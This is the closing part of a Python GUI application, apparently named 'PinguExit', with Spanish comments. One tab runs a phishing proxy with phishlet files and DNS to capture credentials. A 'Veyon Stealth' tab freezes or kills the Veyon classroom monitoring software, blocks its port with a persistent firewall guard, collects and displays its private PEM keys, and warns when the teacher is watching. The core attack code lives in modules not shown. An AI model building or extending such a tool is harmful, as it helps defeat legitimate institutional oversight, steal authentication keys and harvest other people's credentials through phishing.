            self.root.after(0, lambda: self.dns_start_btn.configure(state="normal", fg_color="#e65100"))
            self.root.after(0, lambda: self.dns_stop_btn.configure(state="disabled", fg_color="#37474f"))
    
    def _cap_stop(self):
        """Detiene servidor de captura."""
        self.proxy_module.stop_server(lambda txt: self._write(self.cap_out, txt))
        self.cap_proxy_btn.configure(state="normal", fg_color="#4a148c")
        self.cap_stop_btn.configure(state="disabled", fg_color="#37474f")
    
    def _cap_proxy_dinamico(self):
        """Activa modo proxy dinámico automático (DNS + Servidor HTTP)."""
        target = self.cap_target.get().strip()
        if not target or not target.startswith("http"):
             messagebox.showwarning("Error", "Introduce una URL válida que empiece por http:// o https://")
             return
             
        phishlet = self.cap_phishlet_var.get()
        if phishlet == "Ninguno":
             messagebox.showwarning("Error", "No se han detectado archivos JSON de phishlets en data/phishlets")
             return
        
        if self.proxy_module.activate_dynamic_proxy(target, phishlet, lambda txt: self._write(self.cap_out, txt)):
            self.cap_proxy_btn.configure(state="disabled", fg_color="#37474f")
            self.cap_stop_btn.configure(state="normal", fg_color="#880e4f")
    
    def _build_veyon(self, p):
        """Construye la pestaña Veyon."""
        _pad(p)
        
        # Wake-on-LAN
        ctk.CTkLabel(p, text="Wake-on-LAN",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#26a69a").pack(anchor="w", padx=4, pady=(0,4))
        self.wol_mac = _campo(p, "MAC destino:", "AA:BB:CC:DD:EE:FF")
        bf0 = _btn_row(p, pady=3)
        self._btn(bf0, "Enviar Magic Packet", self._wol_send, "#00796b").pack(side="left")
        
        _sep(p)
        
        # Gestión de claves PEM
        ctk.CTkLabel(p, text="Gestión de Claves Veyon (.pem)",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#26a69a").pack(anchor="w", padx=4, pady=(0,4))
        
        key_row = ctk.CTkFrame(p, fg_color="transparent")
        key_row.pack(fill="x", pady=3)
        ctk.CTkLabel(key_row, text="Clave seleccionada:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.vey_clave_var = ctk.StringVar(value="(ninguna)")
        self.vey_clave_menu = ctk.CTkOptionMenu(
            key_row, variable=self.vey_clave_var,
            values=["(ninguna)"], width=360,
            fg_color="#111111", button_color="#00695c",
            font=ctk.CTkFont(size=11),
            command=self._vey_clave_seleccionada
        )
        self.vey_clave_menu.pack(side="left", padx=(0,8))
        
        bf_k = _btn_row(p, pady=3)
        self._btn(bf_k, "🔄 Recargar claves", self._vey_recargar_claves, "#004d40").pack(side="left", padx=(0,8))
        self._btn(bf_k, "📂 Examinar...", self._vey_examinar, "#37474f").pack(side="left", padx=(0,8))
        self._btn(bf_k, "👁 Ver info clave", self._vey_info_clave, "#1a237e").pack(side="left")
        
        _sep(p)
        
        # Acciones Veyon
        ctk.CTkLabel(p, text="Veyon Stealth",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#26a69a").pack(anchor="w", padx=4, pady=(0,4))
        bf1 = _btn_row(p, pady=3)
        self._btn(bf1, "⏸ Congelar", self._vey_freeze, "#00695c").pack(side="left", padx=(0,8))
        self._btn(bf1, "▶ Descongelar", self._vey_unfreeze, "#37474f").pack(side="left", padx=(0,8))
        self._btn(bf1, "💀 Forzar Cierre", self._vey_force_kill, "#c62828").pack(side="left", padx=(0,8))
        self._btn(bf1, "📁 Escanear llaves", self._vey_keys, "#1565c0").pack(side="left")
        
        bf2 = _btn_row(p, pady=3)
        self._btn(bf2, "🔥 Bloquear pto 11100", self._vey_fw, "#b71c1c").pack(side="left", padx=(0,8))
        self._btn(bf2, "👁 Iniciar Monitor (11100)", self._vey_monitor_start, "#f57f17").pack(side="left", padx=(0,8))
        self._btn(bf2, "🛡 Guardián Firewall (Persistente)", self._vey_persist_start, "#0d47a1").pack(side="left")

        bf3 = _btn_row(p, pady=3)
        self._btn(bf3, "■ Detener Monitores/Guardián", self._vey_stops, "#37474f", width=360).pack(side="left")
        
        _sep(p)
        self.vey_out = _out(p, 7)
    
    def _wol_send(self):
        """Envía Magic Packet WoL."""
        mac = self.wol_mac.get().strip()
        self.veyon_module.send_wol(mac, lambda txt: self._write(self.vey_out, txt))
    
    def _vey_recargar_claves(self):
        """Recarga claves PEM."""
        self._claves_pem = self.veyon_module.find_pem_keys()
        nombres = [os.path.basename(c) for c in self._claves_pem] or ["(ninguna)"]
        self.vey_clave_menu.configure(values=nombres)
        if self._claves_pem:
            self.vey_clave_var.set(nombres[0])
            self._clave_sel = self._claves_pem[0]
            self._write(self.vey_out, f"✔ {len(self._claves_pem)} clave(s) encontrada(s):\n")
            for c in self._claves_pem:
                self._write(self.vey_out, f"   {c}\n")
            self._log(f"[VEYON] {len(self._claves_pem)} clave(s) PEM cargadas.", "ok")
        else:
            self.vey_clave_var.set("(ninguna)")
            self._clave_sel = None
            self._write(self.vey_out, "✗ No se encontraron archivos .pem en las rutas conocidas.\n")
            self._log("[VEYON] Sin claves PEM.", "warn")
    
    def _vey_clave_seleccionada(self, nombre):
        """Maneja selección de clave."""
        for ruta in self._claves_pem:
            if os.path.basename(ruta) == nombre:
                self._clave_sel = ruta
                self._write(self.vey_out, f"» Clave activa: {ruta}\n")
                self._log(f"[VEYON] Clave → {nombre}", "ok")
                return
    
    def _vey_examinar(self):
        """Examina archivos .pem."""
        ruta = filedialog.askopenfilename(
            title="Seleccionar clave .pem",
            filetypes=[("Archivos PEM", "*.pem"), ("Todos", "*.*")],
            initialdir=DIR_BASE
        )
        if ruta:
            if ruta not in self._claves_pem:
                self._claves_pem.append(ruta)
            nombre = os.path.basename(ruta)
            nombres = [os.path.basename(c) for c in self._claves_pem]
            self.vey_clave_menu.configure(values=nombres)
            self.vey_clave_var.set(nombre)
            self._clave_sel = ruta
            self._write(self.vey_out, f"» Clave añadida: {ruta}\n")
            self._log(f"[VEYON] Clave manual: {nombre}", "ok")
    
    def _vey_info_clave(self):
        """Muestra información de la clave."""
        if not self._clave_sel:
            self._write(self.vey_out, "✗ Ninguna clave seleccionada.\n")
            return
        try:
            with open(self._clave_sel, "r", errors="ignore") as f:
                contenido = f.read(600)  # Primeros 600 chars
            self._write(self.vey_out, f"» {self._clave_sel}\n")
            self._write(self.vey_out, "─"*44 + "\n")
            self._write(self.vey_out, contenido + "\n")
            self._log(f"[VEYON] Info: {os.path.basename(self._clave_sel)}", "info")
        except Exception as e:
            self._write(self.vey_out, f"✗ Error leyendo clave: {e}\n")
    
    def _vey_freeze(self):
        """Congela procesos Veyon."""
        self.veyon_module.freeze_veyon(lambda txt: self._write(self.vey_out, txt))
    
    def _vey_force_kill(self):
        """Fuerza cierre de Veyon."""
        self.veyon_module.force_kill_veyon(lambda txt: self._write(self.vey_out, txt))
    
    def _vey_unfreeze(self):
        """Descongela procesos Veyon."""
        self.veyon_module.unfreeze_veyon(lambda txt: self._write(self.vey_out, txt))
    
    def _vey_fw(self):
        """Bloquea puerto de Veyon."""
        self.veyon_module.block_veyon_port(lambda txt: self._write(self.vey_out, txt))
    
    def _vey_keys(self):
        """Escanea llaves Veyon."""
        self.veyon_module.scan_veyon_keys(DIR_BASE, lambda txt: self._write(self.vey_out, txt))
        
    def _vey_monitor_start(self):
        self.veyon_module.start_monitor(lambda txt: self._write(self.vey_out, txt), 
                                        lambda: self._write(self.consola, "\n[!!] ⚠️ ALERTA INTERFAZ: TRÁFICO VEYON RECIBIDO (El profesor mira) [!!]\n\n"))

    def _vey_persist_start(self):
        self.veyon_module.start_persistent_block(lambda txt: self._write(self.vey_out, txt))
        
    def _vey_stops(self):
        self.veyon_module.stop_monitor(lambda txt: self._write(self.vey_out, txt))
        self.veyon_module.stop_persistent_block(lambda txt: self._write(self.vey_out, txt))

if __name__ == "__main__":
    ventana = ctk.CTk()
    app = PinguExit(ventana)
    ventana.mainloop()
